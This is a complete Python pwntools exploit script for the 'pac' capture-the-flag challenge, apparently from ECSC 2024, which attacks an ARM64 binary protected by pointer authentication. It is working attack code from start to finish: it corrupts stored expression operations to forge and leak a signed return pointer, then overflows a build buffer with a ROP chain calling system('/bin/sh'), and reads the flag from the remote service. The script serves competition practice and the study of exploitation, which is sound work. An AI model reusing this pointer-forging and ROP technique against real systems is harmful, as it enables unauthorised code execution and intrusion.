#!/usr/bin/env python3
#
# @mebeim - 2024-06-10
#

import os
import sys
from pathlib import Path
from re import compile
from typing import AnyStr

from pwn import context, log, remote, flat, ELF


HOST = os.getenv('HOST', 'pac.challs.external.open.ecsc2024.it')
PORT = int(os.getenv('PORT', 38311))
FLAG_EXP = compile(rb'TeamItaly\{[^}]+\}')


class Chall:
	def __init__(self):
		with context.local(log_level='error'):
			self.remote = remote(HOST, PORT)

		line = self.remote.recvline()
		if b'do hashcash' in line.lower():
			self.remote.sendlineafter(b'Result: ', b'99:redacted')
		else:
			self.remote.unrecv(line)

	def build(self, save_slot: int, expr_source: AnyStr):
		self.remote.sendlineafter(b'> ', b'1')

		if isinstance(expr_source, str):
			expr_source = expr_source.encode()

		assert b'\n' not in expr_source
		self.remote.sendlineafter(b': ', expr_source)
		self.remote.sendlineafter(b'? ', str(save_slot).encode())

	def validate(self, save_slot: int) -> bool:
		self.remote.sendlineafter(b'> ', b'2')
		self.remote.sendlineafter(b'? ', str(save_slot).encode())
		return self.remote.recvline() == b'Valid expression\n'

	def eval(self, save_slot: int, *inputs: int) -> list[int]:
		self.remote.sendlineafter(b'> ', b'3')
		self.remote.sendlineafter(b'? ', str(save_slot).encode())

		for n in inputs:
			self.remote.sendline(str(n).encode())

		res = []
		while 1:
			l = self.remote.recvline(keepends=False)
			if l.endswith(b'---'):
				break

			i = l.find(b'Output: ')
			if i > -1:
				res.append(int(l[i + 8:]))

		return res

	def exit(self):
		self.remote.sendlineafter(b'> ', b'6')


def run(exe: ELF) -> bool:
	# Value of SP at entry/exit of main(), used by PACIASP/RETAA. Stack is fixed
	# and not randomized in QEMU 7.2.
	STACK_ADDR = 0x5500800bf0
	# Gadget to set x0: ldr x0, [sp, #0x90]; ldp x29, x30, [sp], #0xc0; ret
	GADGET = next(exe.search(bytes.fromhex('e04b40f9 fd7bcca8 c0035fd6')))
	BIN_SH = next(exe.search(b'/bin/sh\0'))
	SYSTEM = exe.sym.system

	log.info('Gadget  @ %#x', GADGET)
	log.info('system  @ %#x', SYSTEM)
	log.info('/bin/sh @ %#x', BIN_SH)

	c = Chall()

	# Save victim expr 0 to forge signed pointer later
	c.build(0, 'neg;' * 32)

	# Build expr 1 to corrupt expr 0:
	#  - Go back 4 slots with "out" to overlap with saved_exprs[0].ops[31]
	#  - Overwrite saved_exprs[0].ops[31].func and .stack with 2 "in"
	c.build(1, 'out;out;out;out;in;in')

	# This will initially fail vaildation but sign all the ops. Once that's
	# done, re-build expr 1 replacing the "out" with "neg" to pass validation.
	# The last two "in" will stay and keep the previously computed stack addr.
	assert not c.validate(1)
	c.build(1, 'neg;neg;neg;neg')

	# Evaluate expr 1 so the "in" ops will be executed **with the stack pointer
	# calculated on the first build**. This will overwrite
	# saved_exprs[0].ops[31] with whatever values we want.
	c.eval(1, GADGET, STACK_ADDR)

	# Forge a signed pointer validating expr 0, which will sign the corrupted
	# saved_exprs[0].ops[31].
	c.validate(0)

	# Leak the signed pointer through expr 1 (similar to what we did above).
	c.build(1, 'out;out;out;out;neg;neg')
	assert not c.validate(1)
	c.build(1, 'neg;neg;neg')

	signed_ptr = c.eval(1)[0]
	if signed_ptr < 0:
		signed_ptr = (1 << 64) + signed_ptr

	log.success('Forged signed ptr: %#x', signed_ptr)

	# Exploit buffer overflow in cmd_build() overwriting the caller's saved x30
	# with the forged ptr.
	chain = flat(signed_ptr, [0] * 5, SYSTEM, [0] * 16, BIN_SH)
	c.build(2, b'A' * 0x108 + chain)

	# GG WP!
	c.exit()

	c.remote.recvuntil(b'Goodbye!\n')
	c.remote.sendline(b'cat flag; exit')
	data = c.remote.recvline()

	with context.local(log_level='error'):
		c.remote.close()

	match = FLAG_EXP.match(data)
	if match is None:
		return False

	print(match.group(0).decode())
	return True


if __name__ == '__main__':
	context(arch='arm64')

	exe = ELF(Path(__file__).parent / 'pac', checksec=False)

	for _ in range(100):
		try:
			if run(exe):
				break
		except EOFError:
			log.failure('EOFError, retrying...')
		except AssertionError:
			log.failure('Bad bytes in pointer, retrying...')
	else:
		sys.exit('Failed to run exploit, exceeded 100 attempts!')
